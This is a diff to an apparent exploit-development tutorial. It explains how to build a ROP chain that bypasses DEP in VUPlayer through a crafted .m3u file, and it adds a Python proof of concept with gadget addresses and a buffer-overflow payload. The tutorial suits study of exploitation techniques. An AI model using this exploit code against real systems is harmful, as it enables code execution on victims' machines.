@@ -399,14 +399,80 @@ EDX crushed, moving on!
 ## EBX ROP Chain
 Another fun one, this time we have to get `0x201` into EBX. Same thing again, couldn't find a nice way to do it directly with EBX; however, EAX comes to the rescue again. 
 
+Before we get carried away, let's make sure we can cleanly get the value of EAX into EBX. Sifting through our two text files, I was able to find this gadget `# XCHG EAX,EBX # RETN 0x00` at `0x10032f32`. Awesome, let's proceed!
+
 This time, I got more creative and was able to find an `# XOR EAX,994803BD # RETN` gadget that was XOR'ing EAX against a static value located at `0x1003a074`. The great thing about this is that when it comes to XOR, the following is true:
 + `a` XOR `b` = `c`
 + `b` XOR `c` = `a`
 + `c` XOR `a` = `b`
 
-So since we know one variable, the static value being XOR'd (`0x994803BD`), and we know a second variable, our desired `0x201` outcome, in fact already know the third variable!
+So since we know one variable, the static value being XOR'd (`0x994803BD`), and we know a second variable, our desired `0x201` outcome, we already know the third variable!
 
 Let's use an [online calculator](https://miniwebtool.com/bitwise-calculator/?data_type=16&number1=994803bd&number2=00000201&operator=XOR) to figure it out. 
 
 ![](/assets/images/AWE/xorcalc.JPG)
 
+As you can see, our third variable is `0x994801bc`. If we XOR this against the static value, the outcome should be `0x201`! 
+
+In summary we are going to:
++ POP `0x994801bc` into EAX
++ XOR EAX with `0x994803BD` giving us an EAX value of `0x201`
++ swap EAX and EBX so that EBX holds our desired goal value 
+
+Let's add this chain to our POC, which now looks like this:
+```python
+import sys
+import struct
+import os
+
+crash_file = "vuplayer-dep.m3u"
+
+# GOALS
+# EAX 90909090 => Nop {COMPLETED}                                                
+# ECX <writeable pointer> => lpflOldProtect {COMPLETED}                                 
+# EDX 00000040 => flNewProtect {COMPLETED}                             
+# EBX 00000201 => dwSize {COMPLETED}                                            
+# ESP ???????? => Leave as is                                         
+# EBP ???????? => Call to ESP (jmp, call, push,..)                
+# ESI ???????? => PTR to VirtualProtect - DWORD PTR of 0x1060E25C
+# EDI 10101008 => ROP-Nop same as EIP
+
+# EAX Chunk Affects: EAX
+eax = struct.pack('<L', 0x10015fe7) # a pointer to # POP EAX # RETN
+eax += struct.pack('<L', 0x90909090)
+
+# ECX Chunk Affects: ECX
+ecx = struct.pack('<L', 0x10601007) # a pointer to # POP ECX # RETN
+ecx += struct.pack('<L', 0x101053DC)    # found a spot in the RWX space of BASSWMA.dll for our writable pointer
+
+# EDX Chunk Affects: EAX, EDX
+edx = struct.pack('<L', 0x106074f8) # a pointer to # XOR EAX,EAX # RETN
+edx += struct.pack('<L', 0x10014474)    # a pointer to # ADD EAX,4 # RETN
+edx += struct.pack('<L', 0x10014474)    # a pointer to # ADD EAX,4 # RETN
+edx += struct.pack('<L', 0x10014474)    # a pointer to # ADD EAX,4 # RETN
+edx += struct.pack('<L', 0x10014474)    # a pointer to # ADD EAX,4 # RETN
+edx += struct.pack('<L', 0x10014474)    # a pointer to # ADD EAX,4 # RETN
+edx += struct.pack('<L', 0x10014474)    # a pointer to # ADD EAX,4 # RETN
+edx += struct.pack('<L', 0x10014474)    # a pointer to # ADD EAX,4 # RETN
+edx += struct.pack('<L', 0x10014474)    # a pointer to # ADD EAX,4 # RETN
+edx += struct.pack('<L', 0x10014474)    # a pointer to # ADD EAX,4 # RETN
+edx += struct.pack('<L', 0x10014474)    # a pointer to # ADD EAX,4 # RETN
+edx += struct.pack('<L', 0x10014474)    # a pointer to # ADD EAX,4 # RETN
+edx += struct.pack('<L', 0x10014474)    # a pointer to # ADD EAX,4 # RETN
+edx += struct.pack('<L', 0x10014474)    # a pointer to # ADD EAX,4 # RETN
+edx += struct.pack('<L', 0x10014474)    # a pointer to # ADD EAX,4 # RETN
+edx += struct.pack('<L', 0x10014474)    # a pointer to # ADD EAX,4 # RETN
+edx += struct.pack('<L', 0x10014474)    # a pointer to # ADD EAX,4 # RETN
+edx += struct.pack('<L', 0x10038a6c)    # a pointer to # XCHG EAX,EDX # RETN
+
+rop = ""
+
+fuzz = "A" * 1012
+fuzz += "\x08\x10\x10\x10" # 10101008  <-- Pointer to a RETN
+fuzz += rop
+fuzz += "C" * (3000 - len(fuzz))
+
+makedafile = open(crash_file, "w")
+makedafile.write(fuzz)
+makedafile.close()
+```
